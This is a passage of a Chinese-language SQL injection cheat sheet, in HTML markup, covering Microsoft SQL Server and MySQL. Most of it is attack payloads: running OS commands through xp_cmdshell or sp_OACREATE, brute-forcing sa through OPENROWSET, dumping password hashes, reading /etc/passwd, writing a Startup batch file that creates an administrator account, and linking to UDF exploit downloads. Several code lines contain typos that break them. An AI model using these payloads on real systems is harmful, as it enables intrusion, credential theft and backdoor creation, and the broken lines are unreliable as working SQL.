&lt;td&gt;字符串长度&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LEN()  &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;从给定字符串中提取子串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SUBSTRING(string,offset,length) &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字符串（’ABC’）不带单引号的表示方式&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT char(0x41) + char(0x42) + char(0x43);  &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;触发时间延迟&lt;/td&gt;
&lt;td&gt;&lt;code&gt;WAITFOR DELAY &#39;0:0:9&#39;; --c触发9秒的时间延迟 &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IF语句&lt;/td&gt;
&lt;td&gt;&lt;code&gt;IF (1=1) SELECT &#39;A&#39; ELSE SELECT &#39;B&#39; -- 返回  &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Microsoft SQL Server 的权限提升&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Microsoft SQL Server 的版本号&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;版本号&lt;/th&gt;
&lt;th&gt;服务包&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;9.00.3042&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 2005 SP2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9.00.2047&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 2005 SP1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9.00.1399&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 2005&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8.00.2039&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 2000 SP4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8.00.818&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 2000 SP3  w/Cumulative Patch MS03-031&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8.00.760&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 2000 SP3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8.00.532&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 2000 SP2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8.00.384&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 2000 SP1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8.00.194&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 2000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7.00.1063&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 7.0 SP4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7.00.961&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 7.0 SP3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7.00.842&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 7.0 SP2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7.00.699&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 7.0 SP1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7.00.623&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 7.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6.50.479&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 6.5 SP5a Update&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6.50.416&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 6.5 SP5a&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6.50.415&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 6.5 SP5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6.50.281&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 6.5 SP4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6.50.258&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 6.5 SP3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6.50.240&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 6.5 SP2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6.50.213&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 6.5 SP1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6.50.201&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server 6.5 RTM&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;OPENROWSET重验证攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下列OPENROWSET查询将尝试使用口令为letmein的sa账户连接到地址为 127.0.0.1 的 SQL Server：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPENROWSET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SQLOLEDB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;sa&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;letmein&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SET FMTONLY OFF execute master..xp_cmdshell &#34;dir&#34;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;攻击数据库服务器：Microsoft SQL Server&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;通过xp_cmdshell执行系统命令&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;os command&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重新启用xp_cmdshell&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;show advanced options&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token keyword&#34;&gt;reconfigure&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;xp_cmdshell&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp configure &lt;span class=&#34;token keyword&#34;&gt;reconfigure&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;xp_cmdshell存储过程已经被删除了，但.dll并未删除，启用它：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_addextendedproc &lt;span class=&#34;token string&#34;&gt;&#39;xp_cmdshell&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;xpsq170.dll&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_addextendedproc &lt;span class=&#34;token string&#34;&gt;&#39;xp_cmdshell&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &#39;xplog70&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dll&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;xp_cmdshell的替代方案&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作为xp_cmdshell存储过程的替代方案，可以执行下列SQL语句来实现相同的效果:&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@altshell&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INT&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; SP_OACREATE &lt;span class=&#34;token string&#34;&gt;&#39;wscript.shell&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@altshell&lt;/span&gt; OUTPUT
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; SP_OAMETHOD &lt;span class=&#34;token variable&#34;&gt;@altshell&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;run&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;null&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%systemroot%\system32\cmd.exe /c&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;要想在Microsoft SQL Server 2005上执行这个替代的shell,首先要执行下列SQL：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;show advanced options&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token keyword&#34;&gt;reconfigure&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;Ole Automation Procedures&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token keyword&#34;&gt;reconfigure&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;破解数据库口令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Microsoft SQL Server 2000的口令哈希存储在sysxlogins表中，可以使用下列SQL语句提取它们&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysxlogins&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Microsoft SQL Server 2005 哈希&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以下SQL语句会检索sa账户的口令哈希：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; password_hash &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sql_logins &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;sa&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;-&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fn_varbintohexstr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;password_hash&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sql_logins&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;文件读/写&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果拥有INSERT和ADMINISTER BULK OPERATIONS许可，就可以读取本地文件。下列SQL语句会将本地文件c:\boot.ini读取到localfile表中：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; localfile&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BULK&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; localfile &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c:\boot.ini&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;MySQL-备忘单&#34;&gt;&lt;a href=&#34;#MySQL-备忘单&#34; class=&#34;headerlink&#34; title=&#34;MySQL 备忘单&#34;&gt;&lt;/a&gt;MySQL 备忘单&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;枚举数据库配置信息和模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;提取MySQL服务器的配置信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;版本&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT @@version;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT user();&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT system user();&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT user FROM mysql.user;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户权限&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT grantee, privilege_type, is_grantable FROM information_schema.user privileges;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;提取MySQL 5.0及之后版本的模式信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;当前数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT database();&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT schema name FROM information  schema.schemata;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出表&lt;/td&gt;
&lt;td&gt;列出当前数据库中的表：  &lt;br&gt;&lt;code&gt;UNION SELECT TABLE_NAME FROM  information_schema.tables WHERE  TABLE_SCHEMA= database();  &lt;/code&gt;&lt;br&gt;列出所有用户自定义数据库中的所有表： &lt;br&gt;&lt;code&gt; SELECT table_schema, tabble_name FROM information_schema.tables  WHERE table_schema!= &#39;information_schema&#39; AND table_schema !=&#39;mysql&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出列&lt;/td&gt;
&lt;td&gt;列出当前数据库中tblUsers表的列名：  &lt;br&gt;&lt;code&gt;SELECT column_name FROM information_schema.columns  WHERE  table_name=&#39;tblUsers&#39;  #返回 tblUsers 表所有列的列名  &lt;/code&gt;&lt;br&gt;列出所有用户定义的数据库中的所有列：  &lt;br&gt;&lt;code&gt;SELECT table_schema, tabble_name, column_name FROM information_schema.columns WHERE table_schema != &#39;information_schema&#39; AND table schema !=&#39;mysql&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL盲注函数:MySQL&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SQL盲注函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查  询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;字符串长度&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LENGTH()&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;从给定字符串中提取子串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT SUBSTR(string, offset, length);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字符串(‘ABC’)不带单引号的表示方式&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT char(65,66,67);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;触发时间延迟&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BENCHMARK(1000000,MD5(&#34;HACK&#34;));  #触发一个可度量的时间延迟 &lt;/code&gt;&lt;br&gt;&lt;code&gt; SLEEP(10);  #触发一个10秒的时间延迟(MySQL 5以及更高版本)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IF语句&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT if (1=1,&#39;A&#39;,&#39;B&#39;); -- 返回&#39;A&#39;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;攻击数据库服务器：MySQL&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;执行系统命令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以通过在目标服务器上创建一个定期执行的恶意脚本文件来执行操作系统命令。下列语句用于从MySQL读取内容并将其写入本地文件中&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;SBLECT &lt;span class=&#34;token string&#34;&gt;&#39;system_commands&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt; trojanpath&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下来的语句会在Windows启动目录中创建一个批处理文件，用于添加一个口令为x的管理员用户X&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;net user x x /add%26%26 net localgroup administrators x /add&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\attack.bat&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;破解数据库口令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;返回一个以冒号分隔的用户名和口令哈希值的列表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; mysql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;直接攻击数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Windows： &lt;a href=&#34;http://www.scoobygang.org/HiDDenWarez/mexec.pl&#34;&gt;www.scoobygang.org/HiDDenWarez/mexec.pl&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Windows： &lt;a href=&#34;http://www.0xdeadbeef.info/exploits/raptor_winudf.tgz&#34;&gt;www.0xdeadbeef.info/exploits/raptor_winudf.tgz&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;基于 UNIX： &lt;a href=&#34;http://www.0xdeadbeef.infb/exploits/raptor_udf.c&#34;&gt;www.0xdeadbeef.infb/exploits/raptor_udf.c&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读取文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;查看UNIX主机上的/etc/passwd文件&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; LOAD_FILE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/etc/passwd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;启用了 MAGIC_QUOTES_GPC,可以使用十六进制字符串代表该文件路径以避免使用单引号字符&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; LOAD_FILE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x2f6574632f706173737764&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#加载/etc/passwd&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;写入文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从mytable表中返回所有数据，并将输出写入到/tmp/hacker中&lt;/p&gt;
